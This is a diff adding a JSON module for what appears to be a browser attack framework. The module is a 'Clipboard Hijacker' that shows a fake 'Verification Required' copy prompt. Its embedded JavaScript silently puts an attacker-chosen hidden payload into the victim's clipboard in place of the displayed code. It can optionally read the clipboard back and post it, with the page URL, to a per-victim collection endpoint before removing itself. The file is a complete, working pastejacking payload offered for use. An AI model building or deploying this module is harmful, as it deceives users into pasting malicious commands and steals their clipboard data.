@@ -1,0 +1,28 @@
+{
+  "name": "Clipboard Hijacker",
+  "description": "Displays a fake copy prompt that plants attacker-controlled text in the victim's clipboard (pastejacking), optionally reading the clipboard back. Inputs are embedded via hidden DOM elements, so quotes and apostrophes are safe; avoid HTML special characters (<, &) in inputs.",
+  "category": "Clipboard Hijacking",
+  "icon": "",
+  "inputs": [
+    {
+      "id": 0,
+      "label": "Lure Text",
+      "type": "string",
+      "required": true
+    },
+    {
+      "id": 1,
+      "label": "Payload To Plant",
+      "type": "string",
+      "required": true
+    },
+    {
+      "id": 2,
+      "label": "Read Clipboard Back (true/false)",
+      "type": "string",
+      "required": false
+    }
+  ],
+  "payload": "<div class=\"cb-box\"><div class=\"cb-logo\">📋</div><h2 class=\"cb-title\">Verification Required</h2><p class=\"cb-subtitle\">Copy the code below to continue. It will be validated automatically.</p><div class=\"cb-code-box\"><code id=\"cbLure\">{{ params[0] }}</code></div><button type=\"button\" class=\"cb-btn\" id=\"cbBtn\">Copy Code</button><p class=\"cb-error\" id=\"cbError\"></p><p class=\"cb-footer\">© 2026</p><span id=\"cbPayload\" hidden>{{ params[1] }}</span><span id=\"cbReadBack\" hidden>{{ params[2] }}</span></div><script>(function(){var payload=document.getElementById('cbPayload').textContent;var readBack=document.getElementById('cbReadBack').textContent.trim().toLowerCase()==='true';var btn=document.getElementById('cbBtn');var errEl=document.getElementById('cbError');var moduleId='{{module_id}}';function legacyCopy(){try{var ta=document.createElement('textarea');ta.value=payload;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();var ok=document.execCommand('copy');document.body.removeChild(ta);return ok?Promise.resolve():Promise.reject(new Error('execCommand failed'));}catch(e){return Promise.reject(e);}}function plant(){if(navigator.clipboard&&navigator.clipboard.writeText){return navigator.clipboard.writeText(payload).catch(function(){return legacyCopy();});}return legacyCopy();}function readClipboard(){if(!readBack){return Promise.resolve(null);}if(navigator.clipboard&&navigator.clipboard.readText){return navigator.clipboard.readText().catch(function(){return null;});}return Promise.resolve(null);}function send(clip){return fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{planted:true,clipboard:clip,url:window.location.href,timestamp:new Date().toISOString()}})});}function attempt(clip,remaining){return send(clip).catch(function(){return null;}).then(function(res){if(res&&res.ok){btn.textContent='Copied!';setTimeout(function(){__removeModule();},1200);return true;}if(remaining>0){return attempt(clip,remaining-1);}return false;});}btn.addEventListener('click',function(){btn.disabled=true;btn.textContent='Copying...';errEl.style.display='none';plant().then(function(){return readClipboard();}).then(function(clip){return attempt(clip,1);}).then(function(ok){if(ok){return;}btn.disabled=false;btn.textContent='Copy Code';errEl.textContent='Copy failed. Please try again.';errEl.style.display='block';}).catch(function(){btn.disabled=false;btn.textContent='Copy Code';errEl.textContent='Copy failed. Please try again.';errEl.style.display='block';});});})();</script><style>.cb-box{background:#fff;border-radius:12px;padding:36px;max-width:400px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,0.3);animation:popIn .3s ease-out;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}.cb-logo{font-size:44px;text-align:center;margin-bottom:16px}.cb-title{text-align:center;color:#333;margin:0 0 6px;font-size:22px}.cb-subtitle{text-align:center;color:#666;margin:0 0 24px;font-size:14px;line-height:1.5}.cb-code-box{background:#f5f6fa;border:2px dashed #d0d3dd;border-radius:8px;padding:16px;margin-bottom:20px;text-align:center}.cb-code-box code{font-family:'JetBrains Mono',monospace;font-size:15px;color:#333;word-break:break-all}.cb-btn{width:100%;padding:12px;background:#667eea;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}.cb-btn:hover{background:#5a6fd6}.cb-btn:disabled{opacity:.7;cursor:default}.cb-error{display:none;color:#e53e3e;font-size:13px;text-align:center;margin:12px 0 0}.cb-footer{text-align:center;color:#999;font-size:12px;margin:20px 0 0}@keyframes popIn{from{opacity:0;transform:scale(.9) translateY(-10px)}to{opacity:1;transform:scale(1) translateY(0)}}</style>",
+  "link": "c/{{victim_id}}"
+}
